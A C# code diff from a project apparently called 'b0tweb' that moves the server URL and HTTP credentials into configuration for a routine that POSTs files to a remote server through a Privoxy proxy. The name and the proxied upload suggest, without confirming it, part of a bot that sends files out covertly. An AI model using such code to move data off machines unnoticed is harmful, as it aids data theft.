@@ -85,21 +85,18 @@ namespace b0tweb
             // Enable proxy
             Privoxy privoxy = new Privoxy();
             privoxy.Establish();
-       
 
             // Set the credentials of the request
-            string username = ""; //TODO: add credentials via config
-            string password = ""; //TODO: add credentials via config
+            string username = Configuration.HTTPUsername;
+            string password = Configuration.HTTPPassword;
             string credentials = Convert.ToBase64String(Encoding.GetEncoding("ISO-8859-1").GetBytes(username + ":" + password));
 
             //Create the basics of the request
-            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(""); //TODO: add url via config
+            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Configuration.HTTPServer);
             request.Headers.Add("Authorization", "Basic " + credentials);
             request.Method = "POST";
             request.Proxy = new WebProxy(HTTPUpload.ProxyAddress);
             request.KeepAlive = true;
-
-            Stream rs = request.GetRequestStream();
 
             string boundary = PrepareRequestBoundary(request, filePath);
             WriteFileContent(request, filePath);
